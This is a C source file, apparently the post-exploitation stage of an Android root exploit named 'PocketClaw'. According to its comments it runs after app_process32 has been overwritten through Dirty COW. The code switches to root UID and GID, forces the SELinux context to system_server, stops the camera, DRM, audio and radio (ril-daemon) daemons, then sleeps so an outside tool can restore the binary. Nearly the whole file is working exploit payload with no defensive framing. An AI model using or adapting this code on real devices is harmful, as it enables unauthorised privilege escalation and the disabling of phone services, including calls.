/*
 * PocketClaw root payload v5 — daemon stopper with sleep.
 *
 * Runs in zygote domain (when init restarts zygote with COW'd app_process32).
 * Transitions to system_server, stops daemons, sleeps to let external
 * restorer replace app_process32, then exits.
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <fcntl.h>
#include <sys/prctl.h>

extern int __system_property_set(const char *key, const char *value);

static int try_setcon(const char *ctx) {
    int fd = open("/proc/self/attr/current", O_WRONLY);
    if (fd < 0) return -1;
    int ret = write(fd, ctx, strlen(ctx));
    close(fd);
    return (ret > 0) ? 0 : -1;
}

int main(int argc, char *argv[]) {
    /* 1. Get root UID (works from zygote domain, no-op from shell) */
    prctl(PR_SET_KEEPCAPS, 1, 0, 0, 0);
    setgid(0);
    setuid(0);

    /* 2. Transition to system_server for ctl.stop */
    try_setcon("u:r:system_server:s0");

    /* 3. Stop daemons */
    __system_property_set("ctl.stop", "qcamerasvr");
    __system_property_set("ctl.stop", "drm");
    __system_property_set("ctl.stop", "audiod");
    __system_property_set("ctl.stop", "ril-daemon");

    /* 4. Sleep 30s — gives external restorer time to Dirty COW
     *    app_process32 back to original before we exit and init
     *    restarts zygote. */
    sleep(30);

    _exit(0);
    return 0;
}
